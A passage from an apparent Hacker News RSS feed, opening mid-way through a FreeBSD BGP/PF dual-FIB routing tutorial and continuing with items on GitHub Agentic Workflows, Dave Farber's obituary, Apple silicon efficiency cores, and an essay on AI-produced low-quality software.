<p><span>PF</span> is where the address-based routing decision happens. When a jail sends a packet from a <span>BGP</span> address, <span>PF</span> assigns it to <span>FIB</span>&nbsp;1:</p>
<div><pre><span></span><code><span>#</span><span> </span><span>BGP</span><span>-</span><span>addressed</span><span> </span><span>jail</span><span> </span><span>traffic</span><span> </span><span>--</span><span>&gt;</span><span> </span><span>force</span><span> </span><span>into</span><span> </span><span>routing</span><span> </span><span>table</span><span> </span><span>1</span><span> </span><span>(</span><span>exits</span><span> </span><span>via</span><span> </span><span>gif0</span><span>)</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>bastille0</span><span> </span><span>inet6</span><span> </span><span>from</span><span> </span><span>$</span><span>bgp_net</span><span> </span><span>to</span><span> </span><span>any</span><span> </span><span>rtable</span><span> </span><span>1</span><span> </span><span>keep</span><span> </span><span>state</span>
</code></pre></div>

<p>The <code>rtable 1</code> directive is the key. It tells <span>PF</span> to route matching packets using <span>FIB</span> 1 instead of the default <span>FIB</span> 0. Since <span>FIB</span> 1’s default route points out gif0 to the <span>BGP</span> router, these packets get encapsulated and sent to router01, which then forwards them to the internet with the correct source&nbsp;address.</p>
<p>For traffic arriving on the tunnel destined for jails, <span>PF</span>&nbsp;uses <code>reply-to</code> to ensure return traffic takes the same&nbsp;path:</p>
<div><pre><span></span><code><span>#</span><span> </span><span>Inbound</span><span> </span><span>BGP</span><span> </span><span>traffic</span><span> </span><span>-</span><span> </span><span>reply</span><span>-</span><span>to</span><span> </span><span>ensures</span><span> </span><span>responses</span><span> </span><span>exit</span><span> </span><span>via</span><span> </span><span>gif0</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>$</span><span>tun_if</span><span> </span><span>reply</span><span>-</span><span>to</span><span> </span><span>(</span><span>$</span><span>tun_if</span><span> </span><span>$</span><span>bgp_hub_ip</span><span>)</span><span> </span><span>inet6</span><span> </span>\
<span>    </span><span>from</span><span> </span><span>any</span><span> </span><span>to</span><span> </span><span>$</span><span>bgp_net</span><span> </span><span>keep</span><span> </span><span>state</span>

<span>#</span><span> </span><span>BGP</span><span> </span><span>ICMPv6</span><span> </span><span>-</span><span> </span><span>also</span><span> </span><span>needs</span><span> </span><span>reply</span><span>-</span><span>to</span><span> </span><span>for</span><span> </span><span>correct</span><span> </span><span>return</span><span> </span><span>path</span>
<span>pass</span><span> </span><span>in</span><span> </span><span>quick</span><span> </span><span>on</span><span> </span><span>$</span><span>tun_if</span><span> </span><span>reply</span><span>-</span><span>to</span><span> </span><span>(</span><span>$</span><span>tun_if</span><span> </span><span>$</span><span>bgp_hub_ip</span><span>)</span><span> </span><span>inet6</span><span> </span><span>proto</span><span> </span><span>ipv6</span><span>-</span><span>icmp</span><span> </span>\
<span>    </span><span>from</span><span> </span><span>any</span><span> </span><span>to</span><span> </span><span>$</span><span>bgp_net</span><span> </span>\
<span>    </span><span>icmp6</span><span>-</span><span>type</span><span> </span><span>{</span><span> </span><span>echoreq</span><span>,</span><span> </span><span>echorep</span><span>,</span><span> </span><span>toobig</span><span>,</span><span> </span><span>timex</span><span>,</span><span> </span><span>paramprob</span><span> </span><span>}</span><span> </span>\
<span>    </span><span>keep</span><span> </span><span>state</span>
</code></pre></div>

<p>Without <code>reply-to</code>, the kernel would consult <span>FIB</span> 0 for return traffic (since the jail itself isn’t in <span>FIB</span> 1), and replies to <span>BGP</span>-addressed connections would exit through vtnet0 with the wrong source routing - getting dropped as spoofed by the provider.&nbsp;The <code>reply-to</code> directive forces <span>PF</span> to send reply packets back out the interface they arrived on, to the specified&nbsp;next-hop.</p>
<h3>The Complete&nbsp;Picture</h3>
<p>Here’s how a request to a <span>BGP</span>-addressed jail service&nbsp;flows:</p>
<div><pre><span></span><code> 1. Client sends packet to 2a06:9801:1c:1000::10 (web jail)
 2. Packet traverses the internet, reaching AS201379 via iFog or Lagrange
 3. router01 forwards it through gif0 tunnel to vps01
 4. vps01 receives proto 41 on vtnet0, decapsulates --&gt; gif0
 5. PF matches: reply-to ($tun_if $bgp_hub_ip), creates state
 6. Packet forwarded to bastille0 --&gt; jail
 7. Jail responds, packet exits on bastille0
 8. PF's state table triggers reply-to: send via gif0 to bgp_hub_ip
 9. gif0 encapsulates (proto 41) using FIB 0 to reach router01
10. router01 receives, forwards to upstream --&gt; internet --&gt; client
</code></pre></div>

<p>And for outbound connections initiated by the jail using its <span>BGP</span>&nbsp;address:</p>
<div><pre><span></span><code>1. Jail sends packet from 2a06:9801:1c:1000::10
2. Packet arrives on bastille0
3. PF matches: "from $bgp_net --&gt; rtable 1"
4. Kernel routes via FIB 1 --&gt; default route --&gt; gif0
5. gif0 encapsulates using FIB 0 --&gt; vtnet0 --&gt; router01
6. router01 receives, forwards to internet (source: 2a06:9801:1c:1000::10)
</code></pre></div>

<p>Meanwhile, the exact same jail can communicate using its provider address through the normal default route in <span>FIB</span> 0, with <span>NAT</span> to the host’s address. Both address spaces coexist on the same interface, differentiated purely by <span>PF</span> rules and <span>FIB</span>&nbsp;selection.</p>
<h2>Verification</h2>
<p>Once everything is running, verification is straightforward. From inside a jail with both&nbsp;addresses:</p>
<div><pre><span></span><code><span># Traffic from the provider address - NATed through the hoster</span>
root@caddy:~<span> </span><span># curl --interface 2001:db8:200:0:1000::10 https://ifconfig.co</span>
<span>2001</span>:db8:200::2

<span># Traffic from the BGP address - routed natively through the tunnel</span>
root@caddy:~<span> </span><span># curl --interface 2a06:9801:1c:1000::10 https://ifconfig.co</span>
2a06:9801:1c:1000::10
</code></pre></div>

<p>The first request shows the host’s NATed provider address. The second shows the jail’s real <span>BGP</span> address - confirming the packet traversed the tunnel and reached the internet through <span>AS201379</span>.</p>
<p>A traceroute from an external host confirms the <span>BGP</span> path is&nbsp;working:</p>
<div><pre><span></span><code>$ mtr -rw 2a06:9801:1c:1000::10
HOST:                              Loss%   Snt   Last   Avg  Best  Wrst StDev
 1.|-- [local-gateway]               0.0%    10    2.6   5.5   2.6  14.1   3.6
    ...
 9.|-- [transit-provider-edge]       0.0%    10   33.8  46.2  33.8  81.2  19.0
10.|-- [ifog-peering-fabric]         0.0%    10   33.5  46.7  33.5  87.0  18.6
11.|-- 2001:db8:300::2               0.0%    10   44.3  59.1  41.9 136.7  33.2
12.|-- 2a06:9801:1c:ffff::2         0.0%    10   72.7  98.9  68.8 198.8  42.4
13.|-- 2a06:9801:1c:1000::10        0.0%    10  164.1  83.1  63.5 164.1  33.4
</code></pre></div>

<p>Traffic enters via the transit provider (hops 9-10), traverses the <span>GRE</span> tunnel to router01 (hop 11), then the <span>GIF</span> tunnel to vps01 (hop 12,&nbsp;the <code>2a06:9801:1c:ffff::2</code> link address), and finally reaches the jail (hop 13). The prefix also shows up correctly on bgp.tools as active and originated by <span>AS201379</span> with both upstreams&nbsp;visible.</p>
<h2>Lessons&nbsp;Learned</h2>
<p><strong><span>MSS</span> clamping is non-negotiable with tunnels.</strong> Every layer of encapsulation eats into the <span>MTU</span>. <span>GIF</span> adds 20 bytes (IPv4 header) to every packet. <span>GRE</span> adds more. If you don’t clamp the <span>TCP</span> <span>MSS</span>, large packets get fragmented or dropped, causing mysterious failures where small requests work but large transfers stall.&nbsp;Set <code>max-mss</code> in <span>PF</span>’s scrub rules for every tunnel interface, calculated as: <span>MTU</span> minus IPv6 header (40 bytes) minus <span>TCP</span> header (20&nbsp;bytes).</p>
<p><strong><span>FIB</span> separation is cleaner than source-based routing hacks.</strong> FreeBSD’s multi-<span>FIB</span> support is a first-class feature.&nbsp;Using <code>rtable</code> in <span>PF</span>&nbsp;and <code>fib</code>/<code>tunnelfib</code> on interfaces gives you full control over which routing table handles which traffic. It’s conceptually cleaner and more debuggable than alternatives like ip6tables <span>MARK</span> targets on&nbsp;Linux.</p>
<p><strong>Bogon filtering matters even for small networks.</strong> The internet is full of misconfigurations and occasional malice. Filtering inbound routes prevents your router from accepting nonsense that could black-hole traffic or worse. The cost is a few lines of configuration; the protection is&nbsp;real.</p>
<p><strong><code>reply-to</code> solves asymmetric routing.</strong> When traffic can arrive on multiple interfaces, the kernel’s default <span>FIB</span> selection for return traffic may choose the wrong path. <span>PF</span>’s <code>reply-to</code> directive forces replies back out the arrival interface, which is exactly what you need for tunnel overlay&nbsp;setups.</p>
<p><strong>Start with two upstreams.</strong> A single upstream means zero redundancy and no ability to do traffic engineering. Two upstreams give you failover and the ability to prefer one path over the other using <span>AS</span>-path prepending or communities. The operational complexity increase is&nbsp;minimal.</p>
<h2>Conclusion</h2>
<p>Running your own <span>AS</span> on the internet is more accessible than most people assume. The barrier isn’t technical complexity - it’s knowing that the option exists. A FreeBSD <span>VM</span>, <span>FRR</span>, a couple of tunnels, and some careful <span>PF</span> rules give you provider-independent addressing, real <span>BGP</span> peering, and a deeper understanding of how the internet actually&nbsp;works.</p>
<p>The dual-<span>FIB</span> approach on the downstream server is the piece I’m most satisfied with. It elegantly solves the “two address spaces, one server” problem without hacks: <span>BGP</span> traffic takes the tunnel, provider traffic takes the default route, and <span>PF</span>’s <code>rtable</code> directive makes the decision based purely on source address. Both paths coexist transparently, and the jails don’t need to know anything about the routing&nbsp;underneath.</p>
<p>Is it overkill for a blog? Absolutely. But the same infrastructure carries every service I run, and having addresses that survive provider migrations has already paid for itself in operational simplicity. Besides, there’s something deeply satisfying about seeing your own <span>AS</span> number show up in a&nbsp;traceroute.</p>
<hr>
<h2>References</h2>
<ul>
<li><a href="https://www.ripe.net/manage-ips-and-asns/resource-management/requesting-resources/"><span>RIPE</span> <span>NCC</span> - Requesting&nbsp;Resources</a></li>
<li><a href="https://docs.frrouting.org/en/latest/"><span>FRR</span>&nbsp;Documentation</a></li>
<li><a href="https://docs.freebsd.org/en/books/handbook/firewalls/">FreeBSD Handbook: Firewalls (<span>PF</span>)</a></li>
<li><a href="https://man.freebsd.org/cgi/man.cgi?query=setfib">FreeBSD&nbsp;setfib(1)</a></li>
<li><a href="https://bgp.tools/">bgp.tools</a> - <span>BGP</span> looking glass and&nbsp;analytics</li>
<li><a href="https://www.ripe.net/manage-ips-and-asns/resource-management/rpki/"><span>RIPE</span> <span>RPKI</span>&nbsp;Documentation</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc5082"><span>RFC</span> 5082 - <span>GTSM</span> (<span>TTL</span>&nbsp;Security)</a></li>
</ul>
<hr>
<p>The internet is a network of networks, and now you’re one of them. There’s a certain elegance in participating in the same routing protocol that glues together every network on the planet - from your single /48 all the way up to the Tier 1 carriers. <span>BGP</span> doesn’t care about your size. It just cares that your routes are valid, your filters are clean, and your packets know where to&nbsp;go.</p>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[GitHub Agentic Workflows (216 pts)]]></title>
            <link>https://github.github.io/gh-aw/</link>
            <guid>46934107</guid>
            <pubDate>Sun, 08 Feb 2026 13:40:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.github.io/gh-aw/">https://github.github.io/gh-aw/</a>, See on <a href="https://news.ycombinator.com/item?id=46934107">Hacker News</a></p>
<div id="readability-page-1" class="page"><div class="page">  <main data-pagefind-body="" lang="en" dir="ltr">   <div> <p>Imagine a world where improvements to your repositories are automatically delivered as pull requests each morning, ready for you to review. Issues are automatically triaged, CI failures analyzed, documentation maintained, test coverage improved and compliance monitored - all defined via simple markdown files.</p>
<p>GitHub Agentic Workflows deliver this: repository automation, running the coding agents you know and love, in GitHub Actions, with strong guardrails and security-first design principles.</p>
<p>GitHub Copilot, Claude by Anthropic or OpenAI Codex for automated, recurring and scheduled jobs to improve, document, test and analyze your repository. Augment CI/CD with Continuous AI - systematic, automated application of AI to software collaboration.</p>
<p>Designed to augment your existing CI/CD with new <a href="https://githubnext.com/projects/continuous-ai">Continuous AI</a> capabilities, GitHub Agentic Workflows has been developed with security in mind by GitHub Next and Microsoft Research. Agentic workflows run with minimal permissions by default, with explicit allowlisting for write operations and sandboxed execution to help keep your repository safe.</p>

 
<div><h3 id="security-built-in">Security Built-In</h3><p><a href="#security-built-in"><span>Section titled “Security Built-In”</span></a></p></div>
<p>Workflows run with read-only permissions by default. Write operations require explicit approval through sanitized <a href="https://github.github.io/gh-aw/reference/glossary/#safe-outputs">safe outputs</a> (pre-approved GitHub operations), with sandboxed execution, tool allowlisting, and network isolation ensuring AI agents operate within controlled boundaries.</p>
<div><h2 id="example-daily-issues-report">Example: Daily Issues Report</h2><p><a href="#example-daily-issues-report"><span>Section titled “Example: Daily Issues Report”</span></a></p></div>
<p><strong>How they work:</strong></p>
<ol>
<li><strong>Write</strong> - Create a <code dir="auto">.md</code> file with your automation instructions in natural language</li>
<li><strong>Compile</strong> - Run <code dir="auto">gh aw compile</code> to transform it into a secure GitHub Actions workflow (<code dir="auto">.lock.yml</code>)</li>
<li><strong>Run</strong> - GitHub Actions executes your workflow automatically based on your triggers</li>
</ol>
<p>Here’s a simple workflow that runs daily to create an upbeat status report:</p>
<div><figure><pre data-language="markdown"><code><div><p><span>---</span></p></div><div><p><span>on</span><span>:</span></p></div><div><p><span> </span><span>schedule</span><span>: </span><span>daily</span></p></div><div><p><span>permissions</span><span>:</span></p></div><div><p><span> </span><span>contents</span><span>: </span><span>read</span></p></div><div><p><span> </span><span>issues</span><span>: </span><span>read</span></p></div><div><p><span> </span><span>pull-requests</span><span>: </span><span>read</span></p></div><div><p><span>safe-outputs</span><span>:</span></p></div><div><p><span> </span><span>create-issue</span><span>:</span></p></div><div><p><span> </span><span>title-prefix</span><span>: </span><span>"</span><span>[team-status] </span><span>"</span></p></div><div><p><span> </span><span>labels</span><span>: [</span><span>report</span><span>, </span><span>daily-status</span><span>]</span></p></div><div><p><span> </span><span>close-older-issues</span><span>: </span><span>true</span></p></div><div><p><span>---</span></p></div><div><p><span>## Daily Issues Report</span></p></div><div><p><span>Create an upbeat daily status report for the team as a GitHub issue.</span></p></div></code></pre></figure></div>
<p>The <code dir="auto">gh aw</code> cli converts this into a GitHub Actions Workflow (.yml) that runs an AI agent (Copilot, Claude, Codex, …) in a containerized environment on a schedule or manually.</p>
<p>The AI coding agent reads your repository context, analyzes issues, generates visualizations, and creates reports - all defined in natural language rather than complex code.</p>

<div> <a href="https://github.github.io/gh-aw/blog/2026-01-13-meet-the-workflows-continuous-simplicity/">  <p>Daily code simplification, refactoring, and style improvements</p> </a> <a href="https://github.github.io/gh-aw/blog/2026-01-13-meet-the-workflows-continuous-refactoring/">  <p>Slash commands for on-demand analysis and automation</p> </a> <a href="https://github.github.io/gh-aw/blog/2026-01-13-meet-the-workflows-documentation/">  <p>Continuous documentation maintenance and consistency</p> </a> <a href="https://github.github.io/gh-aw/blog/2026-01-13-meet-the-workflows-issue-management/">  <p>Automated triage, labeling, and project coordination</p> </a> <a href="https://github.github.io/gh-aw/blog/2026-01-13-meet-the-workflows-metrics-analytics/">  <p>Daily reports, trend analysis, and workflow health monitoring</p> </a> <a href="https://github.github.io/gh-aw/blog/2026-01-13-meet-the-workflows-security-compliance/">  <p>Scanning, alert triage, and compliance monitoring</p> </a> <a href="https://github.github.io/gh-aw/blog/2026-01-13-meet-the-workflows-quality-hygiene/">  <p>CI failure diagnosis, test improvements, and quality checks</p> </a> <a href="https://github.github.io/gh-aw/examples/multi-repo/">  <p>Feature sync and cross-repo tracking workflows</p> </a> <a href="https://github.github.io/gh-aw/examples/scheduled/">  <p>DailyOps, research, and automated maintenance</p> </a>  </div> 

<div> <video controls="" poster="https://github.github.io/gh-aw/videos/install-and-add-workflow-in-cli.png" preload="metadata"> <source src="https://github.github.io/gh-aw/videos/install-and-add-workflow-in-cli.mp4" type="video/mp4"> <p>Your browser doesn't support HTML5 video. Download the video <a href="https://github.github.io/gh-aw/videos/install-and-add-workflow-in-cli.mp4">here</a>.</p> </video> </div>
<p>Install the extension, add a sample workflow, and trigger your first run - all from the command line in minutes.</p>
<div><h2 id="creating-workflows">Creating Workflows</h2><p><a href="#creating-workflows"><span>Section titled “Creating Workflows”</span></a></p></div>
<div> <video controls="" poster="https://github.github.io/gh-aw/videos/create-workflow-on-github.png" preload="metadata"> <source src="https://github.github.io/gh-aw/videos/create-workflow-on-github.mp4" type="video/mp4"> <p>Your browser doesn't support HTML5 video. Download the video <a href="https://github.github.io/gh-aw/videos/create-workflow-on-github.mp4">here</a>.</p> </video> </div>
<p>Create custom agentic workflows directly from the GitHub web interface using natural language.</p>
 </div>  </main> </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Dave Farber has died (207 pts)]]></title>
            <link>https://lists.nanog.org/archives/list/nanog@lists.nanog.org/thread/TSNPJVFH4DKLINIKSMRIIVNHDG5XKJCM/</link>
            <guid>46933401</guid>
            <pubDate>Sun, 08 Feb 2026 11:38:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lists.nanog.org/archives/list/nanog@lists.nanog.org/thread/TSNPJVFH4DKLINIKSMRIIVNHDG5XKJCM/">https://lists.nanog.org/archives/list/nanog@lists.nanog.org/thread/TSNPJVFH4DKLINIKSMRIIVNHDG5XKJCM/</a>, See on <a href="https://news.ycombinator.com/item?id=46933401">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>----- Forwarded message from "Cherry, Hei Yui WONG" &lt;cherry.heiyui@keio.jp&gt; -----</p><div><p>From: "Cherry, Hei Yui WONG" &lt;cherry.heiyui@keio.jp&gt;
Date: Sun, 8 Feb 2026 11:06:40 +0900
Subject: Sad news: Dave Farber has passed away</p>
<p>We are heartbroken to report that our colleague -- our mentor, friend, and
conscience -- David J. Farber passed away suddenly at his home in Roppongi,
Tokyo. He left us on Saturday, Feb. 7, 2026, at the too-young age of 91.</p>
<p>To his son Manny, he was simply ???Dad???, his bedrock whom he will miss
immeasurably. They spoke almost daily by video throughout his time in
Japan, and shared special times on numerous visits. He is survived by son
Manny Farber and daughter-in-law Mei Xu, daughter-in-law Carol Hagan and
grandsons Nate Farber and Sam Farber. He was preceded in death by his wife
Gloria (G.G.) and son Joe Farber.</p>
<p>Dave???s career began with his education at Stevens Institute of Technology,
which he loved deeply and served as a Trustee. He joined the legendary Bell
Labs during its heyday, and worked at the Rand Corporation. Along the way,
among countless other activities, he served as Chief Technologist of the
U.S. Federal Communications Commission; became a proficient
(instrument-rated) pilot; and was an active board member of the Electronic
Frontier Foundation, a digital civil-liberties organization.</p>
<p>His professional accomplishments and impact are almost endless, but often
captured by one moniker: ???grandfather of the Internet,??? acknowledging the
foundational contributions made by his many students at the University of
California, Irvine; the University of Delaware; the University of
Pennsylvania; and Carnegie Mellon University</p>
<p>In 2018, at the age of 83, Dave moved to Japan to become Distinguished
Professor at Keio University and Co-Director of the Keio Cyber Civilization
Research Center (CCRC). He loved teaching, and taught his final class on
January 22, 2026.</p>
<p>At CCRC, one of his most enjoyable activities was co-hosting the IP-Asia
online gathering, which has met every Monday for more than five years and
has addressed many aspects of the impact of technology on civilization.
Dave thrived in Japan in every way.</p>
<p>We, the IP-Asia community, will gather for an online remembrance of Dave at
the usual time and place, 2100 JST on Monday, February 9, 2026.</p>
<p>It???s impossible to summarize a life and career as rich and long as Dave???s
in our few words here. And each of us, even those who knew him for decades,
represent just one facet of his life.  But because we are here at its end,
we have the sad duty of sharing this news. Further information and a more
formal obituary are forthcoming.</p>
<p>With condolences to Manny and the rest of the family,</p>
<p>Jiro Kokuryo
Cherry Wong
Kaori Suzuki
Rodney Van Meter
Dan Gillmor</p>
<p>Manny can be reached at manny.farber@gmail.com.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why E cores make Apple silicon fast (234 pts)]]></title>
            <link>https://eclecticlight.co/2026/02/08/last-week-on-my-mac-why-e-cores-make-apple-silicon-fast/</link>
            <guid>46933365</guid>
            <pubDate>Sun, 08 Feb 2026 11:31:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://eclecticlight.co/2026/02/08/last-week-on-my-mac-why-e-cores-make-apple-silicon-fast/">https://eclecticlight.co/2026/02/08/last-week-on-my-mac-why-e-cores-make-apple-silicon-fast/</a>, See on <a href="https://news.ycombinator.com/item?id=46933365">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-90559">
	
	<!-- .entry-header -->

	
		<div data-first_letter="I">
		<p>If you use an Apple silicon Mac I’m sure you have been impressed by its performance. Whether you’re working with images, audio, video or building software, we’ve enjoyed a new turn of speed since the M1 on day 1. While most attribute this to their Performance cores, as it goes with the name, much is in truth the result of the unsung Efficiency cores, and how they keep background tasks where they should be.</p>
<p>To see what I mean, start your Apple silicon Mac up from the cold, and open Activity Monitor in its CPU view, with its CPU History window open as well. For the first five to ten minutes you’ll see its E cores are a wall of red and green with Spotlight’s indexing services, CGPDFService, mediaanalysisd, BackgroundShortcutRunner, Siri components, its initial Time Machine backup, and often an XProtect Remediator scan. Meanwhile its P cores are largely idle, and if you were to dive straight into using your working apps, there’s plenty of capacity for them to run unaffected by all that background mayhem.</p>
<p><span><img data-attachment-id="83626" data-permalink="https://eclecticlight.co/handecpuhistory/" data-orig-file="https://eclecticlight.co/wp-content/uploads/2024/11/handecpuhistory.jpg" data-orig-size="1396,1388" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="handecpuhistory" data-image-description="" data-image-caption="" data-medium-file="https://eclecticlight.co/wp-content/uploads/2024/11/handecpuhistory.jpg?w=300" data-large-file="https://eclecticlight.co/wp-content/uploads/2024/11/handecpuhistory.jpg?w=940" src="https://eclecticlight.co/wp-content/uploads/2024/11/handecpuhistory.jpg" alt="handecpuhistory" width="1396" height="1388" srcset="https://eclecticlight.co/wp-content/uploads/2024/11/handecpuhistory.jpg 1396w, https://eclecticlight.co/wp-content/uploads/2024/11/handecpuhistory.jpg?w=150&amp;h=150 150w, https://eclecticlight.co/wp-content/uploads/2024/11/handecpuhistory.jpg?w=300&amp;h=298 300w, https://eclecticlight.co/wp-content/uploads/2024/11/handecpuhistory.jpg?w=768&amp;h=764 768w, https://eclecticlight.co/wp-content/uploads/2024/11/handecpuhistory.jpg?w=1024&amp;h=1018 1024w" sizes="(max-width: 1396px) 100vw, 1396px"></span></p>
<p>It’s this stage that scares those who are still accustomed to using Intel Macs. Seeing processes using more than 100% CPU is terrifying, because they know that Intel cores can struggle under so much load, affecting user apps. But on an Apple silicon Mac, who notices or cares that there’s over a dozen mdworker processes each taking a good 50% CPU simultaneously? After all, this is what the Apple silicon architecture is designed for. Admittedly the impression isn’t helped by a dreadful piece of psychology, as those E cores at 100% are probably running at a frequency a quarter of those of P cores shown at the same 100%, making visual comparison <a href="https://eclecticlight.co/2024/11/08/why-cpu-in-activity-monitor-isnt-what-you-think/">completely false</a>.</p>
<p>This is nothing new. Apple brought it to the iPhone 7 in 2016, in its first SoC with separate P and E cores. That’s an implementation of Arm’s <a href="https://en.wikipedia.org/wiki/ARM_big.LITTLE" target="_blank">big.LITTLE</a> announced in 2011, and <a href="https://www.linuxjournal.com/article/8368" target="_blank">development work at Cray</a> and elsewhere in the previous decade. What makes the difference in Apple silicon Macs is how threads are allocated to the two different CPU core types on the basis of a metric known as <a href="https://eclecticlight.co/2025/05/09/what-is-quality-of-service-and-how-does-it-matter/">Quality of Service</a>, or QoS.</p>
<p>As with so much in today’s Macs, QoS has been around since <a href="https://developer.apple.com/documentation/foundation/qualityofservice" target="_blank">OS X 10.10 Yosemite</a>, six years before it became so central in performance. When all CPU cores are the same, it has limited usefulness over more traditional controls like Posix’s <code>nice</code> scheduling priority. All those background tasks still have to be completed, and giving them a lower priority only prolongs the time they take on the CPU cores, and the period in which the user’s apps are competing with them for CPU cycles.</p>
<p>With the experience gained from its iPhones and other devices, Apple’s engineers had a better solution for future Macs. In addition to providing priority-based queues, QoS makes a fundamental distinction between those threads run in the foreground, and those of the background. While foreground threads will be run on P cores when they’re available, they can also be scheduled on E cores when necessary. But background threads aren’t normally allowed to run on P cores, even if they’re delayed by the load on the E cores they’re restricted to. We know this from our inability to promote existing background threads to run on P cores using St. Clair Software’s <a href="https://www.stclairsoft.com/AppTamer/" target="_blank" rel="noopener">App Tamer</a> and the command tool <code>taskpolicy</code>.</p>
<p>This is why, even if you sit and watch all those background processes loading the E cores immediately after starting up, leaving the P cores mostly idle, macOS won’t try running them on its P cores. If it did, even if you wanted it to, the distinction between foreground and background, P and E cores would start to fall apart, our apps would suffer as a consequence, and battery endurance would decline. Gone are the days of <a href="https://eclecticlight.co/2020/06/10/what-to-do-when-a-process-is-using-excessive-cpu/">crashing mdworker processes</a> bringing our Macs to their knees with a spinning beachball every few seconds.</p>
<p>If seeing all those processes using high % CPU can look scary, the inevitable consequence in terms of software architecture might seem terrifying. Rather than building monolithic apps, many of their tasks are now broken out into discrete processes run in the background on demand, on the E cores when appropriate. The fact that an idle Mac has over 2,000 threads running in over 600 processes is good news, and the more of those that are run on the E cores, the faster our apps will be. The first and last M-series chips to have only two E cores were the M1 Pro and Max, since when every one has had at least four E cores, and some as many as six or eight.</p>
<p>Because Efficiency cores get the background threads off the cores we need for performance.</p>
	</div><!-- .entry-content -->

	
	<!-- .entry-footer -->

</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Slop Terrifies Me (320 pts)]]></title>
            <link>https://ezhik.jp/ai-slop-terrifies-me/</link>
            <guid>46933067</guid>
            <pubDate>Sun, 08 Feb 2026 10:31:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ezhik.jp/ai-slop-terrifies-me/">https://ezhik.jp/ai-slop-terrifies-me/</a>, See on <a href="https://news.ycombinator.com/item?id=46933067">Hacker News</a></p>
<div id="readability-page-1" class="page"><div> <main> <article> <h2>🦔 🦔 🦔</h2> <figure>
										<a href="https://ezhik.jp/assets/bro-you-had-chatgpt-write-the-get-well-card-for-your-grandma.png" target="_blank">
											<img src="https://ezhik.jp/assets/thumbnails/bro-you-had-chatgpt-write-the-get-well-card-for-your-grandma.jpg">
										</a>
										
									</figure>
								
<p>What if this is as good as software is ever going to be? What if AI stops getting better and what if people stop caring?</p>

<p>Imagine if this is as good as AI gets. If this is where it stops, you'd still have models that can almost code a web browser, almost code a compiler—and can even present a pretty cool demo if allowed to take a few shortcuts. You'd still get models that can kinda-sorta simulate worlds and write kinda-sorta engaging stories. You'd still get self-driving cars that almost work, except when they don't. You get AI that can make you like 90% of a thing!</p>
<p>90% is a lot. Will you care about the last 10%?</p>
<p>I'm terrified that you won't.</p>
<p>I'm terrified of the <em>good enough to ship</em>—and I'm terrified of nobody else caring. I'm less afraid of AI agents writing apps that they will never experience than I am of the AI herders who won't care enough to actually learn what they ship. And I sure as hell am afraid of the people who will experience the slop and will be fine with it.</p>
<p>As a <a href="https://ezhik.jp/losing-the-plot-that-was-never-there">woodworking enthusiast</a> I am slowly making my peace with standing in the middle of an IKEA. But at the rate things are going in this dropshipping hell, IKEA would be the dream. Software <em>temufication</em> stings much more than software commoditization.</p>

<p>I think Claude and friends can help with crafting good software and with learning new technologies and programming languages—though I sure as hell move slower when I stop to learn and understand than the guy playing Dwarf Fortress with 17 agents. But at the same time AI models seem to constantly nudge towards that same median Next-React-Tailwind, <em>good enough</em> app. These things just don't handle going off the beaten path well.</p>
<figure>
										<a href="https://ezhik.jp/assets/claudes-mid-paper-clone.png" target="_blank">
											<img src="https://ezhik.jp/assets/thumbnails/claudes-mid-paper-clone.jpg" alt="Spend all the tokens you want, trying to make something unique like Paper by FiftyThree with AI tools will just end up looking normal and uninspired.">
										</a>
										<figcaption>Spend all the tokens you want, trying to make something unique like Paper by FiftyThree with AI tools will just end up looking normal and uninspired.</figcaption>
									</figure>
								
<p>Mind you, it's not like slop is anything new. A lot of human decisions had to happen before your backside ended up in an extremely uncomfortable chair, your search results got polluted by poorly-written SEO-optimized articles, and your brain had to deal with a ticket booking website with a user interface so poorly designed that it made you cry. So it's a people problem. Incentives just don't seem to align to make good software. Move fast and break things, etc, etc. You'll make a little artisan app, and if it's any good, Google will come along with a free clone, kill you, then kill its clone—and the world will be left with net zero new good software. And now, with AI agents, it gets even worse as agent herders can do the same thing much faster.</p>
<p>Developers aside, there's also the users. AI models can't be imaginative, and the developers can't afford to, but surely with AI tools, the gap between <em>users</em> and <em>developers</em> will be bridged, ChatGPT will become the new HyperCard and people will turn their ideas into reality with just a few sentences? There's so many people out there who are coding without knowing it, from Carol in Accounting making insane Excel spreadsheets to all the kids on TikTok automating their phones with Apple Shortcuts and hacking up cool Notion notebooks.</p>
<p>But what if those people are an aberration? What if this state of <em>tech learned helplessness</em> cannot be fixed? What if people really do just want a glorified little TV in their pocket? What if most people truly just don't care about tech problems, about privacy, about Liquid Glass, about Microsoft's upsells, about constantly dealing with apps and features which just <em>don't work</em>? What if there will be nobody left to carry the torch? What if the future of computing belongs not to artisan developers or Carol from Accounting, but to whoever can churn out the most software out the fastest? What if <em>good enough</em> really is good enough for most people?</p>
<p>I'm terrified that our craft will die, and nobody will even care to mourn it.</p> <h2>🦔 🦔 🦔</h2> <center><sub><time>2026-02-08</time>  • <a href="https://mastodon.social/@Ezhik/116034520904489092">Discuss on Mastodon</a> • <a href="https://bsky.app/profile/did:plc:png3xhpd6ccblcrcrxsxmfrs/post/3medprdipoc2l">Discuss on Bluesky</a></sub></center></article></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Curating a Show on My Ineffable Mother, Ursula K. Le Guin (155 pts)]]></title>
